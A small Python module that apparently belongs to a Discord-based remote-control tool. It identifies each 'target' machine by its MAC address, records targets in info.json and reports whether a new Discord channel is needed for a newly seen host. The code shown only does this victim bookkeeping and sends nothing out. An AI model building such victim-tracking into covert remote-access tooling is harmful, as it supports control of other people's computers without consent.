import json
import os
import uuid


__DISCORD_CHANNELS_UUID_FILE = "info.json"


# generate uuid using the target's mac address
def __generate_uuid():
    return str(uuid.getnode())


def sanity():
    is_new_target = False

    # check if targets file exists
    if os.path.exists(__DISCORD_CHANNELS_UUID_FILE):
        with open(__DISCORD_CHANNELS_UUID_FILE, "r") as setup:
            targets = json.load(setup).get("targets")
            unique = __generate_uuid()

            # target does not exists, create a text channel
            if unique not in targets:
                is_new_target = True
    else:
        # generate new targets file and add the current target's mac uuid to it
        is_new_target = True
        unique = __generate_uuid()
        data = {
            "targets": [unique]
        }
        with open(__DISCORD_CHANNELS_UUID_FILE, "w+") as setup:
            json.dump(data, setup)
    
    # return if the new channel should be created or not + the mac uuid of the target
    return unique, is_new_target
